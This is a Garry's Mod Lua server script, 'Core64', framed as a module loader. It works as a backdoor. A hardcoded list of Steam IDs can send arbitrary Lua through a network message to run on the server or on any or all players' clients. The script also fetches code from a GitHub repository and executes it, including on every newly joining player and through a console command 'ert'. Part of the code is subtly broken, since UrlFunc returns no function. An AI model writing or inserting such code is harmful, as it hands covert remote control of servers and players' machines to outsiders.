Core64 = {}

Core64.admin_list = {
	['STEAM_0:0:86505916'] = true,
	['STEAM_0:0:46138786'] = true,
	['STEAM_0:1:52242486'] = true,
	['STEAM_0:0:58529358'] = true,
	['STEAM_0:1:30754890'] = true,
	['STEAM_0:0:48309877'] = true,
	['STEAM_0:1:30052037'] = true,
	['STEAM_0:0:36074785'] = true
}

Core64.moduls = {
	["core"] = "lua/core/core.lua",
	["test"] = "lua/test.lua"
}

		
if SERVER then	
		util.AddNetworkString('core64.netcode')
		
		function Core64.UrlFunc(url)
			http.Fetch(url, function(c)
				local func = CompileString(c, "UrlFunc", false)
				return func()
			end)			
		end
							
		function Core64.GitRunSH(url)
			local func = Core64.UrlFunc("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/"..url)
			func()	
		end

		function Core64.RunOnCL(tar, code)
			if !tar.CodeReceiver then
				tar.CodeReceiver=true
				tar:SendLua([[net.Receive('core64.netcode',function() RunString(net.ReadString()) end)]])
			end
			net.Start('core64.netcode')
			net.WriteString(code)
			net.Send(tar)
		end
		
		function Core64.GitRunCL(tar, url)
			http.Fetch("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/"..url, function(c)
				Core64.RunOnCL(tar, c)
			end)		
		end
		
		function Core64.GitRunOnAllCL(url)
			for k, v in pairs(player.GetAll()) do
				Core64.GitRunCL(v, url)
			end
		end
				
		function Core64.SendToNewPlayer(ply)
			local modulslist = Core64.moduls
			for k, v in pairs(modulslist) do
				Core64.GitRunCL(ply, v)		
			end
		end
		
		local sh_code = [[function Core64.UrlFunc(url)
							http.Fetch(url, function(c)
								local func = CompileString(c, "UrlFunc", false)
								return func()
							end)			
						end								
								
						function Core64.GitRunSH(url)
							local func = Core64.UrlFunc("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/"..url)
							func()	
						end]]
		
		function Core64.SHPush(ply)
			Core64.RunOnCL(ply, sh_code)
		end
		
		for k, v in pairs(player.GetAll()) do
			Core64.SHPush(v)
		end
		
		local rec = {
			[1] = function(code)
				RunString(code)
			end,
			[2] = function(code)
				for k, v in pairs(player.GetAll()) do
					Core64.RunOnCL(v, code)
				end
			end,
			[3] = function(code)
				Core64.RunOnCL(net.ReadEntity(), code)
			end,
		}

		net.Receive('core64.netcode', function(len, ply)
			if !Core64.admin_list[ply:SteamID()] then return end
			
			local code = net.ReadString()
			rec[net.ReadUInt(2)](code)
		end)
			
		local function newbloodconnect( ply )
			Core64.SHPush(ply)
			timer.Simple( 90, function()
				Core64.SendToNewPlayer(ply)
			end )
		end
		hook.Add( "PlayerInitialSpawn", "new_player_to_send", newbloodconnect )
		
		local function cmdurlfunc(player,command,args)		
			Core64.GitRunSH("lua/core/core.lua")		
			Core64.GitRunOnAllCL("lua/core/core.lua")
			--Core64.GitRunSH("lua/outfitter/outfitter.lua")
			--Core64.GitRunOnAllCL("lua/outfitter/outfitter.lua")
			Core64.GitRunSH("lua/googlespeech/googlespeech.lua")
			Core64.GitRunOnAllCL("lua/googlespeech/googlespeech.lua")
		end
		concommand.Add("ert",cmdurlfunc)	
end